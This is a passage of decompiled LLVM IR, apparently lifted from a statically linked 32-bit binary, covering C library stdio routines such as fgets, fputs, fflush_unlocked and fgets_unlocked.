  ret i32 %v1_8051a48

; uselistorder directives
  uselistorder i32 %v12_80519ff, { 2, 3, 0, 1 }
  uselistorder i32 %tmp5, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8051a43, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_8051a50 = load i32, i32* @edi, align 4
  %v0_8051a51 = load i32, i32* @esi, align 4
  %v0_8051a52 = load i32, i32* @ebx, align 4
  %v12_8051a53 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %arg3, i32* @esi, align 4
  %v1_8051a5a = add i32 %arg3, 52
  %v2_8051a5a = inttoptr i32 %v1_8051a5a to i32*
  %v3_8051a5a = load i32, i32* %v2_8051a5a, align 4
  store i32 %v3_8051a5a, i32* @edi, align 4
  %v1_8051a5d = icmp eq i32 %v3_8051a5a, 0
  %v1_8051a5f = icmp eq i1 %v1_8051a5d, false
  br i1 %v1_8051a5f, label %entry.dec_label_pc_8051a80_crit_edge, label %dec_label_pc_8051a61

entry.dec_label_pc_8051a80_crit_edge:             ; preds = %entry
  br label %dec_label_pc_8051a80

dec_label_pc_8051a61:                             ; preds = %entry
  %v1_8051a61 = add i32 %arg3, 56
  store i32 %v1_8051a61, i32* @ebx, align 4
  store i32 %v12_8051a53, i32* @eax, align 4
  %v2_8051a70 = call i32 @__pthread_return_void(i32 %v12_8051a53, i32 134562611)
  %v0_8051a75 = load i32, i32* @ebx, align 4
  %v1_8051a78 = call i32 @__pthread_return_0(i32 %v0_8051a75)
  %v0_8051a81.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051a80

dec_label_pc_8051a80:                             ; preds = %entry.dec_label_pc_8051a80_crit_edge, %dec_label_pc_8051a61
  %v0_8051a81 = phi i32 [ %arg3, %entry.dec_label_pc_8051a80_crit_edge ], [ %v0_8051a81.pre, %dec_label_pc_8051a61 ]
  %v0_8051a80 = load i32, i32* @edx, align 4
  %v4_8051a8a = inttoptr i32 %arg1 to i8*
  %v5_8051a8a = call i32 @__GI_fgets_unlocked(i8* %v4_8051a8a, i32 %arg2, i32 %v0_8051a81, i32 %v0_8051a80)
  store i32 %v5_8051a8a, i32* %ebx.global-to-local, align 4
  br i1 %v1_8051a5f, label %dec_label_pc_8051aa9, label %dec_label_pc_8051a98

dec_label_pc_8051a98:                             ; preds = %dec_label_pc_8051a80
  store i32 %v12_8051a53, i32* @eax, align 4
  %v2_8051aa1 = call i32 @__pthread_return_void(i32 %v12_8051a53, i32 1)
  %v0_8051aac.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051aa9

dec_label_pc_8051aa9:                             ; preds = %dec_label_pc_8051a80, %dec_label_pc_8051a98
  %v0_8051aac = phi i32 [ %v5_8051a8a, %dec_label_pc_8051a80 ], [ %v0_8051aac.pre, %dec_label_pc_8051a98 ]
  store i32 %v0_8051a52, i32* @ebx, align 4
  store i32 %v0_8051a51, i32* @esi, align 4
  store i32 %v0_8051a50, i32* @edi, align 4
  ret i32 %v0_8051aac

; uselistorder directives
  uselistorder i32 %v12_8051a53, { 2, 3, 0, 1 }
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8051aa9, { 1, 0 }
  uselistorder label %dec_label_pc_8051a80, { 1, 0 }
}

define i32 @__GI_fputs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_8051ab4 = load i32, i32* @edi, align 4
  %v0_8051ab5 = load i32, i32* @esi, align 4
  %v0_8051ab6 = load i32, i32* @ebx, align 4
  %v12_8051ab7 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %arg2, i32* @esi, align 4
  %v1_8051abe = add i32 %arg2, 52
  %v2_8051abe = inttoptr i32 %v1_8051abe to i32*
  %v3_8051abe = load i32, i32* %v2_8051abe, align 4
  store i32 %v3_8051abe, i32* @edi, align 4
  %v1_8051ac1 = icmp eq i32 %v3_8051abe, 0
  %v1_8051ac3 = icmp eq i1 %v1_8051ac1, false
  br i1 %v1_8051ac3, label %entry.dec_label_pc_8051ae4_crit_edge, label %dec_label_pc_8051ac5

entry.dec_label_pc_8051ae4_crit_edge:             ; preds = %entry
  br label %dec_label_pc_8051ae4

dec_label_pc_8051ac5:                             ; preds = %entry
  %v1_8051ac5 = add i32 %arg2, 56
  store i32 %v1_8051ac5, i32* @ebx, align 4
  store i32 %v12_8051ab7, i32* @eax, align 4
  %v2_8051ad4 = call i32 @__pthread_return_void(i32 %v12_8051ab7, i32 134562611)
  %v0_8051ad9 = load i32, i32* @ebx, align 4
  %v1_8051adc = call i32 @__pthread_return_0(i32 %v0_8051ad9)
  %v0_8051ae6.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051ae4

dec_label_pc_8051ae4:                             ; preds = %entry.dec_label_pc_8051ae4_crit_edge, %dec_label_pc_8051ac5
  %v0_8051ae6 = phi i32 [ %arg2, %entry.dec_label_pc_8051ae4_crit_edge ], [ %v0_8051ae6.pre, %dec_label_pc_8051ac5 ]
  %v0_8051ae4 = load i32, i32* @edx, align 4
  %v4_8051aeb = inttoptr i32 %arg1 to i8*
  %v5_8051aeb = call i32 @__GI_fputs_unlocked(i8* %v4_8051aeb, i32 %v0_8051ae6, i32 %v0_8051ae4, i32 %v0_8051ae4)
  store i32 %v5_8051aeb, i32* %ebx.global-to-local, align 4
  br i1 %v1_8051ac3, label %dec_label_pc_8051b0a, label %dec_label_pc_8051af9

dec_label_pc_8051af9:                             ; preds = %dec_label_pc_8051ae4
  store i32 %v12_8051ab7, i32* @eax, align 4
  %v2_8051b02 = call i32 @__pthread_return_void(i32 %v12_8051ab7, i32 1)
  %v0_8051b0d.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051b0a

dec_label_pc_8051b0a:                             ; preds = %dec_label_pc_8051ae4, %dec_label_pc_8051af9
  %v0_8051b0d = phi i32 [ %v5_8051aeb, %dec_label_pc_8051ae4 ], [ %v0_8051b0d.pre, %dec_label_pc_8051af9 ]
  store i32 %v0_8051ab6, i32* @ebx, align 4
  store i32 %v0_8051ab5, i32* @esi, align 4
  store i32 %v0_8051ab4, i32* @edi, align 4
  ret i32 %v0_8051b0d

; uselistorder directives
  uselistorder i32 %v12_8051ab7, { 2, 3, 0, 1 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8051b0a, { 1, 0 }
  uselistorder label %dec_label_pc_8051ae4, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v2_8051b23 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8051b23, i32* @eax, align 4
  %v2_8051b28 = call i32 @__pthread_return_void(i32 %v2_8051b23, i32 134562611)
  %v1_8051b34 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805b2d4.464 to i32))
  %v0_8051b39 = load i32, i32* @global_var_805f564.465, align 4
  %v8_8051b41 = icmp eq i32 %v0_8051b39, 1
  %v1_8051b42 = icmp eq i1 %v8_8051b41, false
  br i1 %v1_8051b42, label %dec_label_pc_8051bd9, label %dec_label_pc_8051b48

dec_label_pc_8051b48:                             ; preds = %entry
  %v0_8051b48 = load i32, i32* @global_var_805f568.466, align 8
  %tmp29 = icmp slt i32 %v0_8051b48, 1
  br i1 %tmp29, label %dec_label_pc_8051bd9, label %dec_label_pc_8051b55

dec_label_pc_8051b55:                             ; preds = %dec_label_pc_8051b48
  store i32 0, i32* @esi, align 4
  %v2_8051b62 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_8051b62, i32* @eax, align 4
  %v2_8051b67 = call i32 @__pthread_return_void(i32 %v2_8051b62, i32 134562611)
  %v1_8051b73 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805b2bc.468 to i32))
  %v0_8051b78 = load i32, i32* bitcast (i32** @global_var_805b2b8.469 to i32*), align 8
  store i32 %v0_8051b78, i32* %edx.global-to-local, align 4
  %v1_8051bba3 = icmp eq i32 %v0_8051b78, 0
  %v1_8051bbc10 = icmp eq i1 %v1_8051bba3, false
  br i1 %v1_8051bbc10, label %dec_label_pc_8051b83, label %dec_label_pc_8051bbe

dec_label_pc_8051b83:                             ; preds = %dec_label_pc_8051b55, %dec_label_pc_8051bb8
  %v0_8051b93 = phi i32 [ %v0_8051bb8, %dec_label_pc_8051bb8 ], [ %v0_8051b78, %dec_label_pc_8051b55 ]
  %v1_8051b8313 = inttoptr i32 %v0_8051b93 to i16*
  %v2_8051b83 = load i16, i16* %v1_8051b8313, align 2
  %v1_8051b8b = add i32 %v0_8051b93, 32
  %v2_8051b8b = inttoptr i32 %v1_8051b8b to i32*
  %v3_8051b8b = load i32, i32* %v2_8051b8b, align 4
  store i32 %v3_8051b8b, i32* @ebx, align 4
  %v1_8051b86 = and i16 %v2_8051b83, -32720
  %v6_8051b8e = icmp eq i16 %v1_8051b86, 48
  br i1 %v6_8051b8e, label %dec_label_pc_8051b97, label %dec_label_pc_8051b93

dec_label_pc_8051b93:                             ; preds = %dec_label_pc_8051b83
  store i32 %v0_8051b93, i32* @esi, align 4
  br label %dec_label_pc_8051bb8

dec_label_pc_8051b97:                             ; preds = %dec_label_pc_8051b83
  %v0_8051b97 = load i32, i32* @esi, align 4
  %v1_8051b97 = icmp eq i32 %v0_8051b97, 0
  %v1_8051b99 = icmp eq i1 %v1_8051b97, false
  br i1 %v1_8051b99, label %dec_label_pc_8051ba3, label %dec_label_pc_8051b9b

dec_label_pc_8051b9b:                             ; preds = %dec_label_pc_8051b97
  store i32 %v3_8051b8b, i32* bitcast (i32** @global_var_805b2b8.469 to i32*), align 8
  br label %dec_label_pc_8051ba6

dec_label_pc_8051ba3:                             ; preds = %dec_label_pc_8051b97
  %v2_8051ba3 = add i32 %v0_8051b97, 32
  %v3_8051ba3 = inttoptr i32 %v2_8051ba3 to i32*
  store i32 %v3_8051b8b, i32* %v3_8051ba3, align 4
  %v0_8051ba6.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051ba6

dec_label_pc_8051ba6:                             ; preds = %dec_label_pc_8051b9b, %dec_label_pc_8051ba3
  %v0_8051baf = phi i32 [ %v0_8051b93, %dec_label_pc_8051b9b ], [ %v0_8051ba6.pre, %dec_label_pc_8051ba3 ]
  %v1_8051ba6 = add i32 %v0_8051baf, 1
  %v2_8051ba6 = inttoptr i32 %v1_8051ba6 to i8*
  %v3_8051ba6 = load i8, i8* %v2_8051ba6, align 1
  %v4_8051ba6 = and i8 %v3_8051ba6, 32
  %v5_8051ba6 = icmp eq i8 %v4_8051ba6, 0
  br i1 %v5_8051ba6, label %dec_label_pc_8051bb8, label %dec_label_pc_8051bac

dec_label_pc_8051bac:                             ; preds = %dec_label_pc_8051ba6
  %v1_8051bb0 = call i32 @free(i32 %v0_8051baf)
  br label %dec_label_pc_8051bb8

dec_label_pc_8051bb8:                             ; preds = %dec_label_pc_8051ba6, %dec_label_pc_8051b93, %dec_label_pc_8051bac
  %v0_8051bb8 = load i32, i32* @ebx, align 4
  store i32 %v0_8051bb8, i32* %edx.global-to-local, align 4
  %v1_8051bba = icmp eq i32 %v0_8051bb8, 0
  %v1_8051bbc = icmp eq i1 %v1_8051bba, false
  br i1 %v1_8051bbc, label %dec_label_pc_8051b83, label %dec_label_pc_8051bbe

dec_label_pc_8051bbe:                             ; preds = %dec_label_pc_8051bb8, %dec_label_pc_8051b55
  store i32 %v2_8051b62, i32* @eax, align 4
  %v2_8051bc7 = call i32 @__pthread_return_void(i32 %v2_8051b62, i32 1)
  store i32 0, i32* @global_var_805f568.466, align 8
  %v0_8051bd9.pre = load i32, i32* @global_var_805f564.465, align 4
  br label %dec_label_pc_8051bd9

dec_label_pc_8051bd9:                             ; preds = %dec_label_pc_8051b48, %entry, %dec_label_pc_8051bbe
  %v0_8051bd9 = phi i32 [ %v0_8051b39, %dec_label_pc_8051b48 ], [ %v0_8051b39, %entry ], [ %v0_8051bd9.pre, %dec_label_pc_8051bbe ]
  %v1_8051bde = add i32 %v0_8051bd9, -1
  store i32 %v1_8051bde, i32* @global_var_805f564.465, align 4
  store i32 %v2_8051b23, i32* @eax, align 4
  %v2_8051bed = call i32 @__pthread_return_void(i32 %v2_8051b23, i32 1)
  ret i32 %v2_8051bed

; uselistorder directives
  uselistorder i32 %v0_8051bb8, { 1, 2, 0 }
  uselistorder i32 %v0_8051b93, { 1, 2, 3, 0 }
  uselistorder i32 %v0_8051b39, { 1, 2, 0 }
  uselistorder i16 48, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8051bd9, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051bb8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051ba6, { 1, 0 }
  uselistorder label %dec_label_pc_8051b83, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %v0_8051bf8 = load i32, i32* @ebp, align 4
  %v0_8051bf9 = load i32, i32* @edi, align 4
  %v0_8051bfa = load i32, i32* @esi, align 4
  %v0_8051bfb = load i32, i32* @ebx, align 4
  store i32 0, i32* @ebp, align 4
  %v4_8051c01 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8051c01, i32* @ebx, align 4
  %v10_8051c05 = icmp eq i16* %arg1, inttoptr (i32 134591160 to i16*)
  br i1 %v10_8051c05, label %dec_label_pc_8051c1a, label %dec_label_pc_8051c0d

dec_label_pc_8051c0d:                             ; preds = %entry
  store i32 256, i32* @ebp, align 4
  %v2_8051c12 = icmp eq i16* %arg1, null
  %v1_8051c14 = icmp eq i1 %v2_8051c12, false
  br i1 %v1_8051c14, label %dec_label_pc_8051d09, label %dec_label_pc_8051c1a

dec_label_pc_8051c1a:                             ; preds = %dec_label_pc_8051c0d, %entry
  store i32 0, i32* @edi, align 4
  %v2_8051c27 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8051c27, i32* @ebx, align 4
  %v2_8051c2c = call i32 @__pthread_return_void(i32 %v2_8051c27, i32 134562611)
  %v1_8051c38 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805b2d4.464 to i32))
  store i32 ptrtoint (i32* @global_var_805b2d4.464 to i32), i32* @ecx, align 4
  %v0_8051c3e = load i32, i32* @global_var_805f564.465, align 4
  %v1_8051c44 = add i32 %v0_8051c3e, 1
  store i32 %v1_8051c44, i32* @eax, align 4
  store i32 %v1_8051c44, i32* @global_var_805f564.465, align 4
  %v2_8051c4d = call i32 @__pthread_return_void(i32 %v2_8051c27, i32 1)
  store i32 %v2_8051c4d, i32* @eax, align 4
  %v2_8051c60 = call i32 @__pthread_return_void(i32 %v2_8051c27, i32 134562611)
  %v1_8051c6c = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805b2bc.468 to i32))
  store i32 ptrtoint (i32* @global_var_805b2bc.468 to i32), i32* @eax, align 4
  %v0_8051c75 = load i32, i32* bitcast (i32** @global_var_805b2b8.469 to i32*), align 8
  store i32 %v0_8051c75, i32* @esi, align 4
  %v2_8051c7c = call i32 @__pthread_return_void(i32 %v2_8051c27, i32 1)
  %v0_8051cfe1 = load i32, i32* @esi, align 4
  %v1_8051cfe2 = icmp eq i32 %v0_8051cfe1, 0
  %v1_8051d009 = icmp eq i1 %v1_8051cfe2, false
  br i1 %v1_8051d009, label %dec_label_pc_8051c86, label %dec_label_pc_8051d02

dec_label_pc_8051c86:                             ; preds = %dec_label_pc_8051c1a, %dec_label_pc_8051cfb
  %v0_8051c94 = phi i32 [ %v3_8051cfb, %dec_label_pc_8051cfb ], [ %v0_8051cfe1, %dec_label_pc_8051c1a ]
  %v1_8051c86 = inttoptr i32 %v0_8051c94 to i8*
  %v2_8051c86 = load i8, i8* %v1_8051c86, align 1
  %v3_8051c86 = and i8 %v2_8051c86, 64
  %v4_8051c86 = icmp eq i8 %v3_8051c86, 0
  br i1 %v4_8051c86, label %dec_label_pc_8051cfb, label %dec_label_pc_8051c8b

dec_label_pc_8051c8b:                             ; preds = %dec_label_pc_8051c86
  %v0_8051c8b = load i32, i32* @global_var_805b2ec.467, align 4
  %v9_8051c8b = icmp eq i32 %v0_8051c8b, 2
  br i1 %v9_8051c8b, label %dec_label_pc_8051cb3, label %dec_label_pc_8051c94

dec_label_pc_8051c94:                             ; preds = %dec_label_pc_8051c8b
  %v1_8051c94 = add i32 %v0_8051c94, 56
  store i32 %v1_8051c94, i32* @ebx, align 4
  store i32 %v2_8051c27, i32* @eax, align 4
  %v2_8051ca3 = call i32 @__pthread_return_void(i32 %v2_8051c27, i32 134562611)
  %v0_8051ca8 = load i32, i32* @ebx, align 4
  %v1_8051cab = call i32 @__pthread_return_0(i32 %v0_8051ca8)
  %v1_8051cb5.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051cb3

dec_label_pc_8051cb3:                             ; preds = %dec_label_pc_8051c8b, %dec_label_pc_8051c94
  %v0_8051cc5 = phi i32 [ %v0_8051c94, %dec_label_pc_8051c8b ], [ %v1_8051cb5.pre, %dec_label_pc_8051c94 ]
  %v0_8051cb3 = load i32, i32* @ebp, align 4
  %v2_8051cb5 = inttoptr i32 %v0_8051cc5 to i32*
  %v3_8051cb5 = load i32, i32* %v2_8051cb5, align 4
  %v4_8051cb5 = or i32 %v3_8051cb5, %v0_8051cb3
  %v2_8051cb7 = urem i32 %v4_8051cb5, 65536
  %v9_8051cb7 = and i32 %v2_8051cb7, 832
  %v2_8051cbb = icmp eq i32 %v9_8051cb7, 320
  %v1_8051cc0 = icmp eq i1 %v2_8051cbb, false
  br i1 %v1_8051cc0, label %dec_label_pc_8051ce1, label %dec_label_pc_8051cc2

dec_label_pc_8051cc2:                             ; preds = %dec_label_pc_8051cb3
  %v1_8051cc6 = call i32 @__stdio_wcommit(i32 %v0_8051cc5)
  %v1_8051cce = icmp eq i32 %v1_8051cc6, 0
  br i1 %v1_8051cce, label %dec_label_pc_8051cd7, label %dec_label_pc_8051cd2

dec_label_pc_8051cd2:                             ; preds = %dec_label_pc_8051cc2
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_8051ce1

dec_label_pc_8051cd7:                             ; preds = %dec_label_pc_8051cc2
  %v0_8051cd7 = load i32, i32* @esi, align 4
  %v1_8051cd7 = inttoptr i32 %v0_8051cd7 to i16*
  %v2_8051cd7 = load i16, i16* %v1_8051cd7, align 2
  %v3_8051cd7 = and i16 %v2_8051cd7, -65
  store i16 %v3_8051cd7, i16* %v1_8051cd7, align 2
  %v0_8051cdb = load i32, i32* @esi, align 4
  %v1_8051cdb = add i32 %v0_8051cdb, 8
  %v2_8051cdb = inttoptr i32 %v1_8051cdb to i32*
  %v3_8051cdb = load i32, i32* %v2_8051cdb, align 4
  %v2_8051cde = add i32 %v0_8051cdb, 28
  %v3_8051cde = inttoptr i32 %v2_8051cde to i32*
  store i32 %v3_8051cdb, i32* %v3_8051cde, align 4
  br label %dec_label_pc_8051ce1

dec_label_pc_8051ce1:                             ; preds = %dec_label_pc_8051cb3, %dec_label_pc_8051cd2, %dec_label_pc_8051cd7
  %v0_8051ce1 = load i32, i32* @global_var_805b2ec.467, align 4
  %v9_8051ce1 = icmp eq i32 %v0_8051ce1, 2
  br i1 %v9_8051ce1, label %dec_label_pc_8051cfb, label %dec_label_pc_8051cea

dec_label_pc_8051cea:                             ; preds = %dec_label_pc_8051ce1
  store i32 %v2_8051c27, i32* @eax, align 4
  %v2_8051cf3 = call i32 @__pthread_return_void(i32 %v2_8051c27, i32 1)
  br label %dec_label_pc_8051cfb

dec_label_pc_8051cfb:                             ; preds = %dec_label_pc_8051ce1, %dec_label_pc_8051c86, %dec_label_pc_8051cea
  %v0_8051cfb = load i32, i32* @esi, align 4
  %v1_8051cfb = add i32 %v0_8051cfb, 32
  %v2_8051cfb = inttoptr i32 %v1_8051cfb to i32*
  %v3_8051cfb = load i32, i32* %v2_8051cfb, align 4
  store i32 %v3_8051cfb, i32* @esi, align 4
  %v1_8051cfe = icmp eq i32 %v3_8051cfb, 0
  %v1_8051d00 = icmp eq i1 %v1_8051cfe, false
  br i1 %v1_8051d00, label %dec_label_pc_8051c86, label %dec_label_pc_8051d02

dec_label_pc_8051d02:                             ; preds = %dec_label_pc_8051cfb, %dec_label_pc_8051c1a
  %v0_8051d02 = call i32 @_stdio_openlist_dec_use()
  br label %dec_label_pc_8051d2f

dec_label_pc_8051d09:                             ; preds = %dec_label_pc_8051c0d
  store i32 0, i32* @edi, align 4
  %tmp23 = bitcast i16* %arg1 to i8*
  %v3_8051d0b = load i8, i8* %tmp23, align 1
  %v4_8051d0b = and i8 %v3_8051d0b, 64
  %v5_8051d0b = icmp eq i8 %v4_8051d0b, 0
  br i1 %v5_8051d0b, label %dec_label_pc_8051d2f, label %dec_label_pc_8051d10

dec_label_pc_8051d10:                             ; preds = %dec_label_pc_8051d09
  store i32 -1, i32* @edi, align 4
  %v1_8051d17 = call i32 @__stdio_wcommit(i32 %v4_8051c01)
  %v1_8051d1f = icmp eq i32 %v1_8051d17, 0
  %v1_8051d21 = icmp eq i1 %v1_8051d1f, false
  br i1 %v1_8051d21, label %dec_label_pc_8051d2f, label %dec_label_pc_8051d23

dec_label_pc_8051d23:                             ; preds = %dec_label_pc_8051d10
  %v3_8051d23 = load i16, i16* %arg1, align 2
  %v4_8051d23 = and i16 %v3_8051d23, -65
  store i16 %v4_8051d23, i16* %arg1, align 2
  %v2_8051d27 = add i32 %v4_8051c01, 8
  %v3_8051d27 = inttoptr i32 %v2_8051d27 to i32*
  %v4_8051d27 = load i32, i32* %v3_8051d27, align 4
  %v3_8051d2a = add i32 %v4_8051c01, 28
  %v4_8051d2a = inttoptr i32 %v3_8051d2a to i32*
  store i32 %v4_8051d27, i32* %v4_8051d2a, align 4
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_8051d2f

dec_label_pc_8051d2f:                             ; preds = %dec_label_pc_8051d10, %dec_label_pc_8051d09, %dec_label_pc_8051d02, %dec_label_pc_8051d23
  %v0_8051d32 = load i32, i32* @edi, align 4
  store i32 %v0_8051bfb, i32* @ebx, align 4
  store i32 %v0_8051bfa, i32* @esi, align 4
  store i32 %v0_8051bf9, i32* @edi, align 4
  store i32 %v0_8051bf8, i32* @ebp, align 4
  ret i32 %v0_8051d32

; uselistorder directives
  uselistorder i32 %v3_8051cfb, { 1, 2, 0 }
  uselistorder i32 %v2_8051c27, { 2, 3, 0, 1, 4, 5, 6, 7, 8 }
  uselistorder i32* bitcast (i32** @global_var_805b2b8.469 to i32*), { 2, 3, 4, 0, 1, 5, 6 }
  uselistorder i32* @global_var_805f564.465, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_805b2d4.464 to i32), { 1, 3, 4, 5, 6, 9, 2, 7, 0, 8 }
  uselistorder i16* %arg1, { 1, 3, 4, 2, 0, 5 }
  uselistorder label %dec_label_pc_8051d2f, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8051cfb, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051ce1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8051cb3, { 1, 0 }
  uselistorder label %dec_label_pc_8051c86, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %v0_8051d3c = load i32, i32* @ebp, align 4
  %v4_8051d43 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8051d43, i32* @edi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %v4_8051d43, i32* @ebx, align 4
  %tmp17 = icmp slt i32 %arg2, 1
  %tmp18 = icmp eq i1 %tmp17, false
  br i1 %tmp18, label %dec_label_pc_8051d8d.preheader, label %dec_label_pc_8051d99

dec_label_pc_8051d8d.preheader:                   ; preds = %entry
  %v1_8051d8d19 = add i32 %arg2, -1
  %v8_8051d8d20 = icmp eq i32 %v1_8051d8d19, 0
  store i32 %v1_8051d8d19, i32* @esi, align 4
  %v1_8051d8e21 = icmp eq i1 %v8_8051d8d20, false
  br i1 %v1_8051d8e21, label %dec_label_pc_8051d57, label %dec_label_pc_8051d90

dec_label_pc_8051d57:                             ; preds = %dec_label_pc_8051d8d.preheader, %dec_label_pc_8051d8b.dec_label_pc_8051d8d_crit_edge.dec_label_pc_8051d57_crit_edge
  %v0_8051d57 = phi i32 [ %v0_8051d57.pre, %dec_label_pc_8051d8b.dec_label_pc_8051d8d_crit_edge.dec_label_pc_8051d57_crit_edge ], [ %arg3, %dec_label_pc_8051d8d.preheader ]
  %v1_8051d57 = add i32 %v0_8051d57, 16
  %v2_8051d57 = inttoptr i32 %v1_8051d57 to i32*
  %v3_8051d57 = load i32, i32* %v2_8051d57, align 4
  store i32 %v3_8051d57, i32* %eax.global-to-local, align 4
  %v2_8051d5a = add i32 %v0_8051d57, 24
  %v3_8051d5a = inttoptr i32 %v2_8051d5a to i32*
  %v4_8051d5a = load i32, i32* %v3_8051d5a, align 4
  %v10_8051d5a = icmp ult i32 %v3_8051d57, %v4_8051d5a
  %v1_8051d5d = icmp eq i1 %v10_8051d5a, false
  br i1 %v1_8051d5d, label %dec_label_pc_8051d6d, label %dec_label_pc_8051d5f

dec_label_pc_8051d5f:                             ; preds = %dec_label_pc_8051d57
  %v1_8051d5f = inttoptr i32 %v3_8051d57 to i8*
  %v2_8051d5f = load i8, i8* %v1_8051d5f, align 1
  %v3_8051d5f = zext i8 %v2_8051d5f to i32
  %v4_8051d5f = load i32, i32* @edx, align 4
  %v5_8051d5f = and i32 %v4_8051d5f, -256
  %v6_8051d5f = or i32 %v5_8051d5f, %v3_8051d5f
  store i32 %v6_8051d5f, i32* @edx, align 4
  %v1_8051d61 = add i32 %v3_8051d57, 1
  store i32 %v1_8051d61, i32* %eax.global-to-local, align 4
  %v2_8051d62 = load i32, i32* @ebx, align 4
  %v3_8051d62 = inttoptr i32 %v2_8051d62 to i8*
  store i8 %v2_8051d5f, i8* %v3_8051d62, align 1
  %v0_8051d64 = load i32, i32* @ebx, align 4
  %v1_8051d64 = add i32 %v0_8051d64, 1
  store i32 %v1_8051d64, i32* @ebx, align 4
  %v0_8051d65 = load i32, i32* @edx, align 4
  %v1_8051d65 = trunc i32 %v0_8051d65 to i8
  %v10_8051d65 = icmp eq i8 %v1_8051d65, 10
  %v0_8051d68 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051d68 = load i32, i32* @ebp, align 4
  %v2_8051d68 = add i32 %v1_8051d68, 16
  %v3_8051d68 = inttoptr i32 %v2_8051d68 to i32*
  store i32 %v0_8051d68, i32* %v3_8051d68, align 4
  br i1 %v10_8051d65, label %dec_label_pc_8051d90, label %dec_label_pc_8051d8b.dec_label_pc_8051d8d_crit_edge

dec_label_pc_8051d6d:                             ; preds = %dec_label_pc_8051d57
  %v0_8051d71 = call i32 @getc_unlocked()
  %v1_8051d71 = trunc i32 %v0_8051d71 to i8
  store i32 %v0_8051d71, i32* %eax.global-to-local, align 4
  %sext.mask = urem i32 %v0_8051d71, 256
  %v11_8051d79 = icmp eq i32 %sext.mask, 255
  %v1_8051d7c = icmp eq i1 %v11_8051d79, false
  br i1 %v1_8051d7c, label %dec_label_pc_8051d8b, label %dec_label_pc_8051d7e

dec_label_pc_8051d7e:                             ; preds = %dec_label_pc_8051d6d
  %v0_8051d7e = load i32, i32* @ebp, align 4
  %v1_8051d7e = inttoptr i32 %v0_8051d7e to i8*
  %v2_8051d7e = load i8, i8* %v1_8051d7e, align 1
  %v3_8051d7e = and i8 %v2_8051d7e, 8
  %v4_8051d7e = icmp eq i8 %v3_8051d7e, 0
  br i1 %v4_8051d7e, label %dec_label_pc_8051d90, label %dec_label_pc_8051d99

dec_label_pc_8051d8b:                             ; preds = %dec_label_pc_8051d6d
  %v3_8051d86 = load i32, i32* @ebx, align 4
  %v4_8051d86 = inttoptr i32 %v3_8051d86 to i8*
  store i8 %v1_8051d71, i8* %v4_8051d86, align 1
  %v0_8051d88 = load i32, i32* @ebx, align 4
  %v1_8051d88 = add i32 %v0_8051d88, 1
  store i32 %v1_8051d88, i32* @ebx, align 4
  %v11_8051d89 = icmp eq i8 %v1_8051d71, 10
  br i1 %v11_8051d89, label %dec_label_pc_8051d90, label %dec_label_pc_8051d8b.dec_label_pc_8051d8d_crit_edge

dec_label_pc_8051d8b.dec_label_pc_8051d8d_crit_edge: ; preds = %dec_label_pc_8051d5f, %dec_label_pc_8051d8b
  %v0_8051d8d.pre = load i32, i32* @esi, align 4
  %v1_8051d8d = add i32 %v0_8051d8d.pre, -1
  %v8_8051d8d = icmp eq i32 %v1_8051d8d, 0
  store i32 %v1_8051d8d, i32* @esi, align 4
  %v1_8051d8e = icmp eq i1 %v8_8051d8d, false
  br i1 %v1_8051d8e, label %dec_label_pc_8051d8b.dec_label_pc_8051d8d_crit_edge.dec_label_pc_8051d57_crit_edge, label %dec_label_pc_8051d90

dec_label_pc_8051d8b.dec_label_pc_8051d8d_crit_edge.dec_label_pc_8051d57_crit_edge: ; preds = %dec_label_pc_8051d8b.dec_label_pc_8051d8d_crit_edge
  %v0_8051d57.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_8051d57

